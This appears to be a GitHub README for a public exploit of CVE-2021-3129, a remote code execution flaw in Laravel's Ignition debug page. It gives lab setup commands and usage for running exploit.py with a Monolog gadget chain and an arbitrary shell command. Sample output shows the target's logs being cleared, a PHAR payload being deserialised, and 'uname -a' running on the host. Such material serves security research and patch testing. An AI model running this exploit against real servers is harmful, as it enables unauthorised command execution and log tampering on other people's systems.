# CVE-2021-3129_exploit
Exploit for CVE-2021-3129
## Lab setup:
```
$ git clone https://github.com/laravel/laravel.git
$ cd laravel
$ git checkout e849812
$ composer install
$ composer require facade/ignition==2.5.1
$ php artisan serve
```
## Usage:
```
$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
$ cd CVE-2021-3129_exploit
$ chmod +x exploit.py
$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
```
## Example:
```
nth347@nth347:~$ ./exploit.py http://localhost:8000 Monolog/RCE1 "uname -a"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

Linux nth347 5.7.0-kali1-amd64 #1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64 GNU/Linux

[i] Trying to clear logs
[+] Logs cleared
```
## Reference:
* [Ambionics disclosure](https://www.ambionics.io/blog/laravel-debug-rce)
* [CVE-2021-3129](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3129)
